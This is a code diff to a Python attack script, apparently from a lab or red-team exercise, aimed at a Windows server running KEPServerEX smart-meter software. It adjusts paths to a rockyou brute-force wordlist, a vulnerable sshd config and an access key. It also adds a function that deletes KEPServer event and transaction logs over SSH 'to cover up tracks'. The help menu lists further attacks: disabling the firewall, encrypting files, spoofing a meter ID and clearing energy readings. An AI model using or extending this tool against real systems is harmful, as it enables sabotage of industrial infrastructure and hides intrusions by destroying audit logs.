@@ -36,14 +36,14 @@ class AttackScript:
         self.WINDOWS_SERVER_IP = ip
 
         # Set the path for the password brute force file
-        self.PASSWORD_FILE = "resources\\rockyou.txt"
+        self.PASSWORD_FILE = path.join("resources", "rockyou.txt")
 
         # Set the path for vulnerable sshd_config file and the access key
-        self.SSHD_CONFIG_PATH="resources\\vuln_sshd_config"
-        self.ACCESS_KEY_PATH="resources\\accessKey.pub"
+        self.SSHD_CONFIG_PATH = path.join("resources", "vuln_sshd_config")
+        self.ACCESS_KEY_PATH = path.join("resources", "accessKey.pub")
 
         # Set the path for the private SSH key
-        self.PRIVATE_KEY_PATH = "resources\\accessKey"
+        self.PRIVATE_KEY_PATH = path.join("resources", "accessKey")
 
         # Set the path for the shared directory
         self.COPIED_PATH = "C:\\Windows\\temp\\Smartmeter"
@@ -1610,6 +1610,15 @@ class AttackScript:
         ssh.close()
         return False
 
+    def kep_delete_log_files(self):
+        """
+        Delete the log files to cover up tracks
+        """
+        # NOTE: REMINDER TO TEST THIS ON OTHER FOLDER FIRST.
+        log_files_to_delete = ["event.log", "transactions.log"]
+        kep_default_log_folder_path = "C:\\ProgramData\\Kepware\\KEPServerEX\\V6\\"
+        for log_file in log_files_to_delete:
+            self.ssh_run_command(f"rmdir /q {kep_default_log_folder_path}{log_file}")
 
     ########
     # MAIN #
@@ -1651,6 +1660,7 @@ class AttackScript:
             case "25": self.kep_add_spoofed_device()
             case "26": self.ssh_brute_force() # Move this up to be with the other ssh functions
             case "27": self.setup_ssh_config_and_key() # Move this up to be with the other ssh functions
+            case "28": self.kep_delete_log_files()
             case "-h":
                 print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service, \n14 Get hardware info, \n15 Obtain KEPServer info, \n16 Get all KEPServer Users, \n17 Enable KEP Users, \n18 Disable KEP Users, \n19 Obtain KEP User Info.")
             case _: print("Invalid Option! Use option \"-h\" for help!")
